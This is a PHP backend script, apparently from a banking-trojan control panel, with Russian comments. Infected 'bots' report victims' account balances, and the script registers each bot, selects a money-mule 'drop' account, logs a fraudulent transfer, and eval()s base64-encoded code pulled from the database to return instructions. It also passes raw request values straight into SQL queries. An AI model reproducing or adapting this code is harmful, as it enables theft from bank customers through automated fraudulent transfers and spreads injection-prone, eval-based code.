<?php

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.get_config.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

if(!empty($_GET['uid'])) $uid = $_GET['uid'];
if(!empty($_POST['uid'])) $uid = $_POST['uid'];
if(!empty($_GET['sum'])) $sum = $_GET['sum'];
if(!empty($_POST['sum'])) $sum = $_POST['sum'];
if(!empty($_GET['type'])) $type = $_GET['type'];
if(!empty($_POST['type'])) $type = $_POST['type'];
if(!empty($_GET['mode'])) $mode = $_GET['mode'];
if(!empty($_POST['mode'])) $mode = $_POST['mode'];
if(!empty($_GET['cid'])) $userid = $_GET['cid'];
if(!empty($_POST['cid'])) $userid = $_POST['cid'];

if(empty($uid)){
	print_data('BOT_ERROR!', true);
}else{
	$matches = explode('0', $uid, 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}else{
		print_data('BOT_ERROR!', true);
	}
}

$prefix = strtoupper($prefix);
$uid = strtoupper($uid);

if(empty($sum)) print_data('SUM_ERROR!', true);
if(!preg_match('~^[0-9.]+$~', $sum)) print_data('SUM_ERROR!', true);
if(empty($type)) print_data('TYPE_ERROR!', true);

$system = $mysqli->query('SELECT id, nid, percent, format FROM bf_systems WHERE (`nid` = \''.$type.'\') LIMIT 1');
if($system->nid != $type) print_data('TYPE_NOTFOUND!', true);

if(empty($userid)){
	if(file_exists($dir . 'cache/clients.json')){
		$clients = @json_decode(@file_get_contents($dir . 'cache/clients.json'), true);
		if(is_array($clients) && $clients[$prefix]){
			$userid = $clients[$prefix];
		}
	}
}

//$system->sum = number_format((($sum*$system->percent)/100), 0, '.', '');
$system->sum = floor(($sum*$system->percent)/100);
//$system->sum = floor((($sum*$system->percent)/100)/1000)*1000;
 
if($mode == 'stat'){
	$sum = (int) $_GET['sum'];
	file_put_contents('cache/stat/' . $system->nid . '_' . $prefix . $uid, $sum);
	echo 'OK!';
	exit;
}

$bot = $mysqli->query('SELECT * FROM bf_bots WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\') LIMIT 1');

if($bot->prefix == $prefix && $bot->uid == $uid){
	// Зарегистрированный бот
	$drop = $mysqli->query('SELECT prefix, uid, system FROM bf_drops WHERE (`prefix` = \''.$prefix.'\') AND (`uid` = \''.$uid.'\') AND (`system` = \''.$system->nid.'\') AND (`status` = \'0\') LIMIT 1');
	
	if(empty($drop->prefix) && empty($drop->uid) && empty($drop->system)){
		// Дроп не давался или повторно нужно дать
		//$mysqli->query('update bf_bots set status = \'1\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$bot->id.'\') LIMIT 1');
		$mysqli->query("INSERT DELAYED INTO bf_balance (userid, prefix, uid, ip, system, balance) VALUES ('".$userid."', '".$bot->prefix."', '".$bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$system->nid."', '".$sum."')");
		
		$drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND (\''.$system->sum.'\' > `from`) AND (\''.$system->sum.'\' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
		
		if(!empty($drop->id) && !empty($drop->system)){
			$drop->other = array_map('base64_decode', json_decode($drop->other, true));
			if($drop->other['round'] == '1') $system->sum = floor((($sum*$system->percent)/100)/1000)*1000;
			if($drop->vat != '0') $system->vat = number_format(($system->sum*$drop->vat)/100, 2, '.', '');

			if($drop->other['test'] == 1){
				$mysqli->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
			}else{
				$mysqli->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
			}
			
			$mysqli->query("INSERT DELAYED INTO bf_transfers (userid, prefix, uid, ip, system, `to`, num, balance, status, passiv, info, drop_id) VALUES ('".$userid."', '".$bot->prefix."', '".$bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$system->nid."', '".$drop->acc."', '".$system->sum."', '".$sum."', '2', '1', '".base64_encode(json_encode(array('system' => $system, 'drop' => $drop)))."', '".$drop->id."')");
			
			include_once($dir . 'includes/functions.numformat.php');
			
			eval(base64_decode($system->format));
		}else{
			exit;
		}
	}else{
		// Дроп уже давался
		// НЕЧЕГО НЕ ДЕЛАЕМ!
		//$mysqli->query("INSERT DELAYED INTO bf_balance (prefix, uid, ip, system, balance) VALUES ('".$bot->prefix."', '".$bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$system->nid."', '".$sum."')");
		exit;
	}
}else{
	// Новый бот
	$mysqli->query("INSERT DELAYED INTO bf_bots (userid, prefix, uid, ip, system, last_date) VALUES ('".$userid."', '".$prefix."', '".$uid."', '".$_SERVER['REMOTE_ADDR']."', '".$system->nid."', CURRENT_TIMESTAMP())");
	$mysqli->query("INSERT DELAYED INTO bf_balance (userid, prefix, uid, ip, system, balance) VALUES ('".$userid."', '".$prefix."', '".$uid."', '".$_SERVER['REMOTE_ADDR']."', '".$system->nid."', '".$sum."')");
	
	$drop = $mysqli->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND (\''.$system->sum.'\' > `from`) AND (\''.$system->sum.'\' < `to`) AND (`system` LIKE \'%'.$system->nid.'|%\') LIMIT 1');
	
	if(!empty($drop->id) && !empty($drop->system)){
		//$drop->other = array_map('base64_decode', json_decode($drop->other));
		$drop->other = array_map('base64_decode', json_decode($drop->other, true));
		if($drop->vat != '0') $system->vat = number_format(($system->sum*$drop->vat)/100, 2, '.', '');
		
		if($drop->other['test'] == 1){
			$mysqli->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
		}else{
			$mysqli->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
		}
		
		$mysqli->query("INSERT DELAYED INTO bf_transfers (userid, prefix, uid, ip, system, `to`, num, balance, status, passiv, info, drop_id) VALUES ('".$userid."', '".$prefix."', '".$uid."', '".$_SERVER['REMOTE_ADDR']."', '".$system->nid."', '".$drop->acc."', '".$system->sum."', '".$sum."', '2', '1', '".base64_encode(json_encode(array('system' => $system, 'drop' => $drop)))."', '".$drop->id."')");

		include_once($dir . 'includes/functions.numformat.php');
		eval(base64_decode($system->format));
	}else{
		exit;
	}
}

?>